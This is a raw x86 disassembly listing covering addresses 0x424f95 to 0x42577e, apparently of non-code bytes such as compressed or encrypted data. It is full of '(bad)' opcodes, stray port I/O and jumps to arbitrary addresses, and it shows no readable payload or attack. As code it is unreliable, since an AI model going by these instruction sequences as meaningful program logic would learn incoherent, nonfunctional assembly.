  424f95:	or     eax,0xe1bee9fb
  424f9a:	popf   
  424f9b:	dec    ebp
  424f9c:	setne  BYTE PTR [ebx]
  424f9f:	loope  0x424f46
  424fa1:	sub    eax,0x906b570a
  424fa6:	lds    esp,FWORD PTR [edx-0x40]
  424fa9:	test   eax,0x3dd8174d
  424fae:	out    dx,eax
  424faf:	adc    DWORD PTR [ebp+0x414ab0c0],eax
  424fb5:	mov    esp,0x6bb31ba2
  424fba:	mov    eax,DWORD PTR [ecx]
  424fbc:	jae    0x424f50
  424fbe:	ss jp  0x424faa
  424fc1:	cs push eax
  424fc3:	cmp    eax,0x2de01dd2
  424fc8:	shl    DWORD PTR [edx+0x4d80bd6d],0x1b
  424fcf:	(bad)  
  424fd0:	sti    
  424fd1:	jmp    0x424fb3
  424fd3:	lds    esi,FWORD PTR [ebx-0xdf97580]
  424fd9:	cmp    DWORD PTR [esi+0x78ca0ca6],0xc23cdcc9
  424fe3:	mov    eax,ebx
  424fe5:	and    esp,DWORD PTR [ebp-0x4c]
  424fe8:	or     BYTE PTR [edi-0x251d4d19],ah
  424fee:	mov    dh,0x69
  424ff0:	jmp    0xc825:0xcf1a68ba
  424ff7:	ja     0x424fec
  424ff9:	cs and al,0x86
  424ffc:	or     bl,BYTE PTR [ebx+eiz*8]
  424fff:	imul   esi,edx,0xa1aca20c
  425005:	mov    eax,0xf241c35b
  42500a:	and    eax,0x1364e8f6
  42500f:	mov    ds:0x723dae5b,eax
  425014:	pop    ss
  425015:	xchg   ecx,eax
  425016:	jno    0x424fb3
  425018:	popf   
  425019:	xor    eax,0xfd47e1cb
  42501e:	mov    ebx,0x46f48c7d
  425023:	hlt    
  425024:	(bad)  
  425025:	mov    edx,ds
  425027:	mov    bh,0xca
  425029:	pop    ss
  42502a:	pop    eax
  42502b:	mov    bh,0xe9
  42502d:	push   ecx
  42502e:	shl    ebp,1
  425030:	stc    
  425031:	mov    edx,0xe04218ad
  425036:	inc    edx
  425037:	pop    es
  425038:	(bad)  
  425039:	call   0xf996537
  42503e:	jnp    0x425008
  425040:	test   al,0x93
  425042:	add    dl,BYTE PTR ds:0x224b2c05
  425048:	jo     0x4250ad
  42504a:	mov    eax,ds:0x57a866e0
  42504f:	pop    esp
  425050:	ins    DWORD PTR es:[edi],dx
  425051:	sbb    bh,al
  425053:	jb     0x4250c8
  425055:	inc    ebp
  425056:	inc    esp
  425057:	push   es
  425058:	retf   0x5423
  42505b:	nop
  42505c:	fidiv  WORD PTR [ecx-0x60f5ecb4]
  425062:	fisubr DWORD PTR [edx+eiz*2+0x75b712bf]
  425069:	inc    eax
  42506a:	mov    cl,0xf5
  42506c:	lods   eax,DWORD PTR ds:[esi]
  42506d:	aad    0xf4
  42506f:	sub    DWORD PTR [ebx+0xe16339],0x76bcb8ab
  425079:	fild   WORD PTR [esi]
  42507b:	inc    esi
  42507c:	mov    dl,0xc8
  42507e:	xchg   BYTE PTR [esi+0x17ed16c4],bl
  425084:	add    al,0xa6
  425086:	test   DWORD PTR [esp+edx*1-0x57],edi
  42508a:	mov    ebp,ecx
  42508c:	push   0xb97c62da
  425091:	out    0xb1,eax
  425093:	and    esp,DWORD PTR [ecx+0x4c29c512]
  425099:	mov    cl,0x3e
  42509b:	mov    ebx,0x83a8de3d
  4250a0:	xchg   ecx,eax
  4250a1:	cs lahf 
  4250a3:	sbb    BYTE PTR [edx],dh
  4250a5:	push   ebp
  4250a6:	arpl   si,sp
  4250a8:	scas   eax,DWORD PTR es:[edi]
  4250a9:	and    BYTE PTR [ebx+0x14],bl
  4250ac:	inc    edi
  4250ad:	(bad)  
  4250ae:	out    dx,al
  4250af:	add    BYTE PTR ds:0xca8aa56f,ch
  4250b5:	jge    0x425106
  4250b7:	xchg   DWORD PTR ds:0x70629cb0,eax
  4250bd:	and    DWORD PTR [edx],edx
  4250bf:	fsubr  QWORD PTR [esi+0x73]
  4250c2:	push   0x1d
  4250c4:	in     al,dx
  4250c5:	jne    0x4250ee
  4250c7:	dec    esi
  4250c8:	xchg   DWORD PTR [edx+0x7801114e],ecx
  4250ce:	jmp    0x4250a6
  4250d0:	mov    esi,0xfbe6407d
  4250d5:	shl    BYTE PTR [ecx+0x49],0x60
  4250d9:	pop    edx
  4250da:	(bad)  [edx+0x47538ae1]
  4250e0:	adc    BYTE PTR [edx-0x40955f19],dl
  4250e6:	dec    ecx
  4250e7:	inc    ebx
  4250e8:	test   al,0x57
  4250ea:	xchg   ebx,eax
  4250eb:	push   edx
  4250ec:	(bad)  
  4250ed:	pop    edx
  4250ee:	xor    eax,0xd7168ce1
  4250f3:	ret    
  4250f4:	int3   
  4250f5:	aam    0x79
  4250f7:	addr16 cdq 
  4250f9:	mov    ah,BYTE PTR [ebp-0x1]
  4250fc:	das    
  4250fd:	add    BYTE PTR es:[eax],al
	...
  425108:	add    BYTE PTR [eax],al
  42510a:	pop    ecx
  42510b:	push   ebp
  42510c:	push   esp
  42510d:	push   edx
  42510e:	pop    esp
  42510f:	push   ebx
  425110:	pop    edi
  425111:	pop    edi
  425112:	xchg   ebx,eax
  425113:	stos   DWORD PTR es:[edi],eax
  425114:	mov    ebx,0x84153296
  425119:	push   esi
  42511a:	xchg   esp,eax
  42511b:	fiadd  WORD PTR [ecx]
  42511d:	add    BYTE PTR [esi+eax*1+0x0],bh
  425121:	add    BYTE PTR [edi],bh
  425123:	pop    ebp
  425124:	sbb    esp,DWORD PTR [ecx+0x33e03a91]
  42512a:	je     0x4250af
  42512c:	(bad)  
  42512d:	call   0xcfc9e242
  425132:	ja     0x4250e7
  425134:	ja     0x42511f
  425136:	mov    esi,DWORD PTR [edi]
  425138:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425139:	inc    ecx
  42513a:	ror    BYTE PTR [edi-0x75c63ce8],1
  425140:	(bad)  
  425141:	cwde   
  425142:	cdq    
  425143:	inc    edi
  425144:	add    ebx,DWORD PTR [esi-0x2a]
  425147:	push   0x2c304f03
  42514c:	xor    BYTE PTR [edi],bh
  42514e:	xchg   BYTE PTR [esi+eiz*4+0x2b],bl
  425152:	fs mov dl,0x3e
  425155:	(bad)  [eax]
  425157:	stos   DWORD PTR es:[edi],eax
  425158:	into   
  425159:	jns    0x425175
  42515b:	jb     0x425173
  42515d:	mov    edx,es
  42515f:	and    BYTE PTR [edi],0xd3
  425162:	pop    edx
  425163:	jae    0x425107
  425165:	sbb    eax,0xa930da79
  42516a:	or     al,0xf6
  42516c:	pop    esp
  42516d:	push   esp
  42516e:	clc    
  42516f:	or     DWORD PTR [ebp+0x41f6f819],esp
  425175:	jecxz  0x4251ed
  425177:	xchg   esi,eax
  425178:	lahf   
  425179:	jle    0x425146
  42517b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42517c:	cdq    
  42517d:	add    DWORD PTR [esi-0x10aff5c4],edx
  425183:	mul    DWORD PTR [edi]
  425185:	xchg   esi,eax
  425186:	aam    0xe9
  425188:	arpl   WORD PTR [eax+0x1d6c8c38],dx
  42518e:	outs   dx,BYTE PTR ds:[esi]
  42518f:	(bad)  
  425190:	sbb    al,0xea
  425192:	cli    
  425193:	push   edx
  425194:	mov    al,ds:0x42c9417c
  425199:	xchg   esi,eax
  42519a:	sub    BYTE PTR [ebp+ebx*1-0x69bc35af],ch
  4251a1:	pushf  
  4251a2:	sbb    eax,0x37496af2
  4251a7:	sub    BYTE PTR [edi+0x63],cl
  4251aa:	ror    BYTE PTR gs:[ebp-0x8abdaff],0xdc
  4251b2:	ins    DWORD PTR es:[edi],dx
  4251b3:	test   eax,0x9be4f98b
  4251b8:	xchg   edi,eax
  4251b9:	fxch   st(5)
  4251bb:	fimul  DWORD PTR [eax+0x77]
  4251be:	fwait
  4251bf:	arpl   WORD PTR [edi],bx
  4251c1:	xchg   ecx,eax
  4251c2:	aad    0x1e
  4251c4:	mov    ebx,0x187a5490
  4251c9:	stc    
  4251ca:	gs into 
  4251cc:	mov    eax,0xa32f1962
  4251d1:	mov    ds:0xe89c2862,eax
  4251d6:	in     eax,0x89
  4251d8:	mov    esp,0xce4ae549
  4251dd:	(bad)  
  4251de:	fimul  DWORD PTR [ecx-0x46c48021]
  4251e4:	scas   eax,DWORD PTR es:[edi]
  4251e5:	pop    esp
  4251e6:	dec    ebx
  4251e7:	aas    
  4251e8:	mov    eax,0x6fb994b6
  4251ed:	je     0x4251bc
  4251ef:	mov    al,ch
  4251f1:	or     al,BYTE PTR [edi-0x77]
  4251f4:	fld    QWORD PTR [ecx-0x4729cfb5]
  4251fa:	jg     0x425259
  4251fc:	and    eax,0x215f0299
  425201:	push   0x53e16453
  425206:	arpl   WORD PTR [ecx+0x1c677a79],dx
  42520c:	retf   0x1e41
  42520f:	and    al,0x45
  425211:	xchg   ebx,eax
  425212:	dec    ebx
  425213:	push   ds
  425214:	xchg   ebx,eax
  425215:	lods   eax,DWORD PTR ds:[esi]
  425216:	xor    al,BYTE PTR [eax+0x3f]
  425219:	push   es
  42521a:	mov    esp,0x95758eda
  42521f:	mov    es,edx
  425221:	jne    0x4251fb
  425223:	popf   
  425224:	nop
  425225:	dec    edx
  425226:	push   esi
  425227:	mov    eax,ds:0x2739cb9c
  42522c:	mov    dl,0x28
  42522e:	sti    
  42522f:	pop    edx
  425230:	pop    edx
  425231:	fcomp  DWORD PTR [eax+ebp*2-0x74]
  425235:	push   ebx
  425236:	xchg   esp,eax
  425237:	add    al,0xad
  425239:	loop   0x425220
  42523b:	mov    bh,0xf6
  42523d:	mov    dl,0x35
  42523f:	adc    al,0x52
  425241:	mov    cl,0xc4
  425243:	inc    ebx
  425244:	push   ebx
  425245:	jae    0x4251e3
  425247:	sbb    eax,0xfeb3315a
  42524c:	jmp    0x31f58625
  425251:	loop   0x425290
  425253:	in     al,0xba
  425255:	xchg   ecx,eax
  425256:	inc    ebp
  425257:	mov    DWORD PTR [ecx+0x7b6a3c55],eax
  42525d:	popa   
  42525e:	cmp    BYTE PTR [eax],bl
  425260:	pop    edx
  425261:	out    0xfc,al
  425263:	jmp    0x491c:0x6b0ae8b3
  42526a:	cdq    
  42526b:	pop    ss
  42526c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42526d:	clc    
  42526e:	iret   
  42526f:	enter  0x1336,0xf5
  425273:	adc    DWORD PTR [esi-0x28003c01],ecx
  425279:	imul   eax,DWORD PTR [edx+0x509408c4],0x23d43cd5
  425283:	mov    bh,0xb5
  425285:	mov    al,0xeb
  425287:	das    
  425288:	push   es
  425289:	and    ch,bl
  42528b:	out    dx,al
  42528c:	adc    BYTE PTR [esi+0x49],bh
  42528f:	shl    DWORD PTR [eax],1
  425291:	jle    0x425290
  425293:	xchg   edi,eax
  425294:	pop    esp
  425295:	jno    0x42528b
  425297:	int    0xda
  425299:	dec    edx
  42529a:	inc    ebx
  42529b:	mov    edx,0xb1a2688a
  4252a0:	dec    edx
  4252a1:	icebp  
  4252a2:	push   ebp
  4252a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4252a4:	mov    ch,BYTE PTR [edx]
  4252a6:	jp     0x425254
  4252a8:	aaa    
  4252a9:	idiv   DWORD PTR [esi-0x6961e67f]
  4252af:	push   edx
  4252b0:	test   DWORD PTR [edi+0x45],0xa29eab72
  4252b7:	hlt    
  4252b8:	push   edi
  4252b9:	add    edi,DWORD PTR [esi-0x7067adf2]
  4252bf:	daa    
  4252c0:	into   
  4252c1:	cmp    eax,eax
  4252c3:	adc    eax,0x5e6b1f38
  4252c8:	mov    ecx,0x472b82e4
  4252cd:	mov    bl,0x1
  4252cf:	in     eax,0x4c
  4252d1:	sbb    bl,dl
  4252d3:	push   ecx
  4252d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4252d5:	jl     0x4252a6
  4252d7:	into   
  4252d8:	mov    esi,0xd1b91ef7
  4252dd:	scas   eax,DWORD PTR es:[edi]
  4252de:	fmul   DWORD PTR [edi-0x66]
  4252e1:	loopne 0x425315
  4252e3:	dec    esp
  4252e4:	cmc    
  4252e5:	stc    
  4252e6:	add    edi,DWORD PTR [ecx]
  4252e8:	cmp    ax,WORD PTR [edx-0x2a]
  4252ec:	mov    WORD PTR [eax-0xe],?
  4252ef:	call   0xf8e4c94c
  4252f4:	and    edi,eax
  4252f6:	jg     0x42534c
  4252f8:	out    0x7,al
  4252fa:	imul   ebx,DWORD PTR [ebx],0xffffff9d
  4252fd:	cmp    al,0x67
  4252ff:	xchg   ebp,eax
  425300:	mov    ebp,0x11316985
  425305:	pop    eax
  425306:	mov    al,ds:0x297d9270
  42530b:	sub    ah,BYTE PTR [edi]
  42530d:	daa    
  42530e:	and    edi,edx
  425310:	mov    esp,0xed1b6922
  425315:	mov    edx,ebp
  425317:	outs   dx,BYTE PTR ds:[esi]
  425318:	(bad)  
  42531a:	add    ebx,edx
  42531c:	je     0x4252df
  42531e:	cmc    
  42531f:	rol    BYTE PTR [edx-0x7c],0x3f
  425323:	sahf   
  425324:	dec    ecx
  425325:	cmp    dh,BYTE PTR [edi]
  425327:	ins    BYTE PTR es:[edi],dx
  425328:	fistp  WORD PTR [ecx+0x7e]
  42532b:	fidivr WORD PTR [ecx+0x5c]
  42532e:	call   0x3527:0xbe386e69
  425335:	dec    ebx
  425336:	loop   0x42533c
  425338:	sbb    esi,DWORD PTR [ebx-0x5b7bc655]
  42533e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42533f:	es gs dec ecx
  425342:	inc    ebx
  425343:	imul   edi,DWORD PTR [esi],0x4a
  425346:	aam    0x11
  425348:	pop    ds
  425349:	adc    cl,bh
  42534b:	fwait
  42534c:	aaa    
  42534d:	push   ss
  42534e:	neg    ah
  425350:	adc    al,0x96
  425352:	loop   0x42532f
  425354:	inc    esp
  425355:	inc    ebp
  425356:	sub    BYTE PTR [esi+0x6e],dh
  425359:	xlat   BYTE PTR ds:[ebx]
  42535a:	dec    edx
  42535b:	mov    ch,0xd2
  42535d:	sti    
  42535e:	cwde   
  42535f:	jmp    0x425345
  425361:	nop
  425362:	pop    ebx
  425363:	jnp    0x425363
  425365:	and    ebx,DWORD PTR [edx-0x44431401]
  42536b:	fwait
  42536c:	dec    ebx
  42536d:	inc    ebp
  42536e:	add    DWORD PTR [ebx+ebx*1],eax
  425371:	pop    ebx
  425372:	and    al,0x61
  425374:	shr    ebp,1
  425376:	test   DWORD PTR [ecx-0x6e],0xf0687795
  42537d:	dec    ebp
  42537e:	shr    DWORD PTR [edx],1
  425380:	scas   al,BYTE PTR es:[edi]
  425381:	les    eax,FWORD PTR [ebx+0x604e3eb3]
  425387:	xchg   edx,eax
  425388:	add    eax,0xf18ab028
  42538d:	iret   
  42538e:	inc    edx
  42538f:	lods   al,BYTE PTR ds:[esi]
  425390:	loop   0x42534e
  425392:	popf   
  425393:	fxch   st(3)
  425395:	out    0x72,al
  425397:	ins    BYTE PTR es:[edi],dx
  425398:	xchg   edi,eax
  425399:	inc    edx
  42539a:	fwait
  42539b:	sbb    al,0x21
  42539d:	fidivr WORD PTR [esi+0x4cb093dd]
  4253a3:	cmp    BYTE PTR [esp+ecx*8],dl
  4253a6:	dec    esp
  4253a7:	push   ecx
  4253a8:	sub    DWORD PTR [esi+0x6cbeaa81],0xffffffa1
  4253af:	push   eax
  4253b0:	imul   edx,DWORD PTR [ecx-0x2a],0x696386f
  4253b7:	xchg   edx,eax
  4253b8:	sub    eax,0xc8ed66b3
  4253bd:	add    bh,al
  4253bf:	out    dx,al
  4253c0:	or     dh,BYTE PTR [esi]
  4253c2:	jb     0x4253bb
  4253c4:	mov    DWORD PTR [edx-0x48],edx
  4253c7:	jns    0x4253bb
  4253c9:	mov    es,WORD PTR [edx-0x717de0da]
  4253cf:	jle    0x4e3bb5af
  4253d5:	sub    eax,0xbe45ef6a
  4253da:	sbb    bl,BYTE PTR [edx]
  4253dc:	aad    0xbf
  4253de:	cmp    dl,BYTE PTR [esi+ebx*1]
  4253e1:	adc    BYTE PTR [eax-0x33d23c65],0x6e
  4253e8:	call   0xccd2bf32
  4253ed:	mov    WORD PTR [ebx],es
  4253ef:	scas   eax,DWORD PTR es:[edi]
  4253f0:	loopne 0x425416
  4253f2:	cld    
  4253f3:	(bad)  
  4253f4:	push   ecx
  4253f5:	pop    ecx
  4253f6:	sbb    BYTE PTR [edx-0x72a8bdbf],0x7d
  4253fd:	mov    dh,0xd1
  4253ff:	shl    BYTE PTR [ebx+0x1a4aa345],cl
  425405:	sbb    eax,0x39df20b9
  42540a:	mov    bh,0x58
  42540c:	mov    edx,0xa0687dfb
  425411:	retf   0xb48c
  425414:	lea    ebp,[ecx]
  425416:	sub    esi,DWORD PTR [ecx-0x26]
  425419:	addr16 in al,0xf7
  42541c:	dec    edx
  42541d:	lahf   
  42541e:	shl    BYTE PTR [ebp-0x4a5b2765],cl
  425424:	jge    0x425407
  425426:	mov    al,ds:0x85c1a4bb
  42542b:	das    
  42542c:	lods   al,BYTE PTR ds:[esi]
  42542d:	or     eax,DWORD PTR es:[ebx]
  425430:	cmp    DWORD PTR [esi-0x130883b9],edx
  425436:	fsubr  st(0),st
  425438:	sub    BYTE PTR [ebx+0x47],bh
  42543b:	test   BYTE PTR [edi+eax*1],ch
  42543e:	das    
  42543f:	mov    ecx,0x28695e40
  425444:	loope  0x425488
  425446:	mov    bh,dh
  425448:	rol    DWORD PTR [edi-0x5534a387],1
  42544e:	xor    ch,bh
  425450:	dec    ebp
  425451:	cmp    dh,BYTE PTR [ebp-0x6e5aa61]
  425457:	aad    0x3d
  425459:	mov    dl,0x19
  42545b:	push   esi
  42545c:	inc    ebx
  42545d:	sub    ecx,DWORD PTR [edi]
  42545f:	push   esi
  425460:	or     ah,BYTE PTR [ecx]
  425462:	sub    edx,DWORD PTR [ebx]
  425464:	add    eax,0xc4b7c6b2
  425469:	xchg   BYTE PTR [edi+0x13],al
  42546c:	clc    
  42546d:	int    0xd5
  42546f:	scas   eax,DWORD PTR es:[edi]
  425470:	inc    ecx
  425471:	stos   DWORD PTR es:[edi],eax
  425472:	dec    edx
  425473:	mov    dh,0x8
  425475:	leave  
  425476:	outs   dx,BYTE PTR ds:[esi]
  425477:	mov    eax,ds:0x2c5b56a8
  42547c:	jp     0x4254b5
  42547e:	and    dh,BYTE PTR [edi-0x491e72a2]
  425484:	mov    ebx,0xd7877738
  425489:	and    al,0x7e
  42548b:	fist   WORD PTR [edi-0x78]
  42548e:	mov    eax,ds:0x9b5966b4
  425493:	ror    ecx,0x36
  425496:	addr16 (bad) 
  425498:	std    
  425499:	in     eax,0xa7
  42549b:	arpl   cx,dx
  42549d:	int    0x79
  42549f:	push   ss
  4254a0:	push   cs
  4254a1:	push   esp
  4254a2:	or     eax,0xff25829b
  4254a7:	and    DWORD PTR [eax+0x4d5d2ba2],esp
  4254ad:	sbb    ax,0x55e7
  4254b1:	in     al,0xa4
  4254b3:	cmp    bh,BYTE PTR [esi]
  4254b5:	xor    al,bl
  4254b7:	sahf   
  4254b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4254b9:	cli    
  4254ba:	mov    es,WORD PTR [edi-0x813a3e1]
  4254c0:	push   edx
  4254c1:	cli    
  4254c2:	cmp    DWORD PTR [ebp+0x45],esi
  4254c5:	jecxz  0x425452
  4254c7:	and    esp,DWORD PTR [ecx+0x98b75aa]
  4254cd:	pusha  
  4254ce:	je     0x425532
  4254d0:	and    ebx,DWORD PTR [ebx+ebp*1+0x3f41246c]
  4254d7:	xchg   ebp,eax
  4254d8:	mov    esp,0x2b3e1f76
  4254dd:	cmp    ebx,DWORD PTR [ebx+0x61]
  4254e0:	inc    esi
  4254e1:	cmp    DWORD PTR gs:[edx-0x15],ecx
  4254e5:	xchg   ecx,eax
  4254e6:	mov    ah,0x46
  4254e8:	or     DWORD PTR [ecx],ecx
  4254ea:	bnd jns 0x4254d3
  4254ed:	add    al,0xa8
  4254ef:	aad    0x39
  4254f1:	loop   0x425542
  4254f3:	stos   DWORD PTR es:[edi],eax
  4254f4:	adc    ecx,DWORD PTR [edx]
  4254f6:	pop    eax
  4254f7:	mov    cl,BYTE PTR [ecx+ebx*1+0x18]
  4254fb:	cmp    DWORD PTR [edi+0x1e4cec6a],0xfffffff9
  425502:	test   eax,0xb57340f9
  425507:	je     0x425511
  425509:	call   0x1e99438c
  42550e:	stos   DWORD PTR es:[edi],eax
  42550f:	pop    esi
  425510:	(bad)  [esi+ebp*2+0x7c]
  425514:	daa    
  425515:	xchg   esi,eax
  425516:	push   ds
  425517:	leave  
  425518:	pop    esi
  425519:	cli    
  42551a:	pop    edx
  42551b:	mov    dh,0x74
  42551d:	adc    ebx,DWORD PTR [ebp+edi*1+0x5ada9a0f]
  425524:	ja     0x425573
  425526:	xor    eax,0x6dfe0916
  42552b:	ret    
  42552c:	test   DWORD PTR [ebx],edx
  42552e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42552f:	sub    BYTE PTR [edi-0x58],bh
  425532:	jae    0x4254bc
  425534:	sbb    edx,DWORD PTR [ebx+0x68]
  425537:	repnz sub al,0xfa
  42553a:	pop    es
  42553b:	push   edi
  42553c:	mov    eax,ds:0x2dac9c94
  425541:	jo     0x425545
  425543:	sahf   
  425544:	stos   BYTE PTR es:[edi],al
  425545:	out    dx,eax
  425546:	repz fcmovnu st,st(7)
  425549:	push   0xffffffa7
  42554b:	dec    eax
  42554c:	sbb    al,0xa0
  42554e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42554f:	adc    esi,DWORD PTR [edx+0x3d1e96d6]
  425555:	push   ebx
  425556:	sti    
  425557:	jbe    0x42553d
  425559:	aas    
  42555a:	xchg   ebp,eax
  42555b:	xchg   edx,eax
  42555c:	or     dh,dh
  42555e:	xchg   ebx,eax
  42555f:	ins    DWORD PTR es:[edi],dx
  425560:	pop    eax
  425561:	loope  0x4255ad
  425563:	ret    
  425564:	test   DWORD PTR [eax+ebp*2-0x38dd77cc],ebp
  42556b:	jl     0x4255a0
  42556d:	ret    
  42556e:	iret   
  42556f:	daa    
  425570:	mov    al,ds:0xf7cec915
  425575:	lods   eax,DWORD PTR ds:[esi]
  425576:	mov    ebx,0xd07e71a2
  42557b:	imul   ecx,ebx,0x559fab2b
  425581:	pop    ebp
  425582:	inc    esi
  425583:	and    DWORD PTR [ecx+0x2d],ecx
  425586:	stos   DWORD PTR es:[edi],eax
  425587:	cmp    al,0x32
  425589:	(bad)  
  42558a:	push   esp
  42558b:	add    al,BYTE PTR [ecx+ebx*2+0x3c53f323]
  425592:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425593:	adc    al,0xe5
  425595:	shl    esi,1
  425597:	xchg   ecx,eax
  425598:	js     0x425616
  42559a:	mov    BYTE PTR [ecx],ch
  42559c:	or     BYTE PTR [edi+0x44577183],0xee
  4255a3:	xor    DWORD PTR [eax-0x5cceff1a],ebp
  4255a9:	add    BYTE PTR [edi-0x3841f729],0x1
  4255b0:	stc    
  4255b1:	cs mov esi,0xa6c78ce
  4255b7:	xlat   BYTE PTR ds:[ebx]
  4255b8:	aas    
  4255b9:	xor    eax,0x73e801d3
  4255be:	mov    ebx,0x5e66aa0d
  4255c3:	(bad)  
  4255c5:	sub    BYTE PTR [edx],dl
  4255c7:	mov    ds:0x498fc756,eax
  4255cc:	(bad)  
  4255cd:	ret    0x7441
  4255d0:	jmp    FWORD PTR [eax-0x58af81ef]
  4255d6:	cs dec esi
  4255d9:	jmp    0x593c121b
  4255de:	mov    dl,0x32
  4255e0:	pop    ds
  4255e1:	adc    cl,BYTE PTR [edx-0x1d43b911]
  4255e7:	or     dl,bl
  4255e9:	inc    esi
  4255ea:	bound  edi,QWORD PTR gs:[edi+0x23]
  4255ee:	push   cs
  4255ef:	fiadd  DWORD PTR [edi]
  4255f1:	mov    al,0x45
  4255f3:	fbld   TBYTE PTR [esi]
  4255f5:	ficom  WORD PTR [esi-0x483fe395]
  4255fb:	ror    al,cl
  4255fd:	xchg   ecx,eax
  4255fe:	cmp    cl,BYTE PTR [eax+0x20]
  425601:	(bad)  
  425602:	loope  0x4255f5
  425604:	stc    
  425605:	mov    WORD PTR [edi+0x2e],?
  425608:	or     ah,BYTE PTR [edx+0xbd6a0a4]
  42560e:	add    eax,0x55517f11
  425613:	pop    ss
  425614:	retf   0xd1a8
  425617:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425618:	inc    ah
  42561a:	pop    edx
  42561b:	fiadd  DWORD PTR [edx]
  42561d:	pop    esp
  42561e:	fist   DWORD PTR [edi]
  425620:	out    0x73,eax
  425622:	or     edi,0xffffff8d
  425625:	jp     0x42561d
  425627:	lock neg BYTE PTR [esi-0xd]
  42562b:	add    DWORD PTR [edi+0x25],eax
  42562e:	adc    BYTE PTR [ecx+0x1a],cl
  425631:	or     dh,BYTE PTR [ebp-0x4b]
  425634:	cmp    eax,0xd8377589
  425639:	dec    ax
  42563b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42563c:	outs   dx,DWORD PTR ds:[esi]
  42563d:	out    0x5f,al
  42563f:	jg     0x425630
  425641:	inc    ebp
  425642:	adc    BYTE PTR [ebx-0x7d205081],0xff
  425649:	cli    
  42564a:	out    0xba,eax
  42564c:	push   ds
  42564d:	xor    DWORD PTR [edi+eax*8-0x9c62dac],edx
  425654:	and    BYTE PTR [ecx+edi*2+0x40],dl
  425658:	push   0xd6763715
  42565d:	test   eax,0xe977ae90
  425662:	xchg   edi,eax
  425663:	xchg   ebp,eax
  425664:	pop    ebx
  425665:	jl     0x4256c5
  425667:	(bad)  
  425668:	xchg   ebx,eax
  425669:	popa   
  42566a:	xor    BYTE PTR [eax+esi*2-0x4a1205bd],bh
  425671:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425672:	lahf   
  425673:	stc    
  425674:	push   0x66
  425676:	jae    0x425689
  425678:	retf   
  425679:	mov    ecx,esi
  42567b:	int    0xa0
  42567d:	push   0xffffffe3
  42567f:	inc    ebx
  425680:	arpl   WORD PTR [ebx+0x12],ax
  425683:	fist   WORD PTR [ecx+0x41]
  425686:	fwait
  425687:	call   0x7d9a:0x357581f4
  42568e:	test   al,0x33
  425690:	jecxz  0x4256df
  425692:	add    DWORD PTR [eax-0x52325759],esi
  425698:	add    esi,DWORD PTR [eax-0x71345395]
  42569e:	mov    bl,0x43
  4256a0:	mov    ecx,DWORD PTR [ebx-0x26]
  4256a3:	mov    al,ds:0xbdb8a0f8
  4256a8:	mov    ah,0xad
  4256aa:	pop    ebp
  4256ab:	jge    0x4256de
  4256ad:	(bad)  
  4256ae:	int    0x7
  4256b0:	test   DWORD PTR [edi-0x41],esp
  4256b3:	cmp    dh,BYTE PTR [edi-0x58]
  4256b6:	xor    esp,DWORD PTR [ebx+ecx*8-0x65223dee]
  4256bd:	dec    ebx
  4256be:	xchg   edx,eax
  4256bf:	and    bh,BYTE PTR [eax-0x2a]
  4256c2:	into   
  4256c3:	stc    
  4256c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256c5:	sub    eax,ebp
  4256c7:	xchg   edi,eax
  4256c8:	xor    edi,esp
  4256ca:	xor    BYTE PTR [ecx+0x755f7cf3],dh
  4256d0:	push   esi
  4256d1:	in     al,0x6d
  4256d3:	cwde   
  4256d4:	daa    
  4256d5:	add    ebx,0xffffff97
  4256d8:	aad    0x29
  4256da:	mov    ebx,0x3e0700a5
  4256df:	mov    ebp,0xed54380e
  4256e4:	dec    esi
  4256e5:	xchg   ebp,eax
  4256e7:	(bad)  
  4256e9:	sub    BYTE PTR [ebx-0x39075eb1],dh
  4256ef:	fucomip st,st(4)
  4256f1:	outs   dx,DWORD PTR ds:[esi]
  4256f2:	cmp    bl,BYTE PTR [esi-0x7]
  4256f5:	enter  0x65eb,0x97
  4256f9:	mov    ecx,0xa723e5b
  4256fe:	rcl    BYTE PTR [edx+0xc],cl
  425701:	test   al,0x37
  425703:	adc    DWORD PTR [ebp-0x62],esp
  425706:	push   es
  425707:	mov    cl,0x9f
  425709:	xor    BYTE PTR [ebp-0x6b],bh
  42570c:	and    al,BYTE PTR [ebx]
  42570e:	jae    0x4256ec
  425710:	pop    eax
  425711:	adc    DWORD PTR [ebx],eax
  425713:	jno    0x42573a
  425715:	inc    esp
  425716:	test   eax,0x5b8cf2c9
  42571b:	sbb    eax,0x35924ffb
  425720:	or     ecx,ebp
  425722:	xchg   edi,eax
  425723:	pop    edi
  425724:	(bad)  
  425725:	loopne 0x425702
  425727:	imul   esi,edi,0xcdde56a5
  42572d:	shl    DWORD PTR [edi],cl
  42572f:	fwait
  425730:	jo     0x425709
  425732:	mov    bh,0x1d
  425735:	outs   dx,DWORD PTR ds:[esi]
  425736:	rcr    BYTE PTR [edi],cl
  425738:	jo     0x425729
  42573a:	fscale 
  42573c:	test   ecx,0xedc000b4
  425742:	xchg   BYTE PTR [edx],bh
  425744:	ss clc 
  425746:	mov    edi,0x6f0ecdf8
  42574b:	inc    ebp
  42574c:	jmp    0xcc57aa37
  425751:	and    bh,dh
  425753:	rol    DWORD PTR [edi+0x7c],0xc7
  425757:	jmp    0x68226ac5
  42575c:	stos   DWORD PTR es:[edi],eax
  42575d:	rcr    DWORD PTR [ecx],1
  42575f:	xchg   esi,eax
  425760:	xchg   DWORD PTR [ebx+eax*1+0x6a],ebp
  425764:	adc    eax,DWORD PTR [esi+0x22]
  425767:	(bad)  
  425768:	mov    eax,ds:0x31a67f15
  42576d:	dec    ecx
  42576e:	dec    ebp
  42576f:	or     BYTE PTR [esi+0x2da7607c],0xc1
  425776:	dec    edi
  425777:	push   edi
  425778:	fmul   QWORD PTR [edx+0x7a616a31]
  42577e:	repnz es rcl ah,0x2e
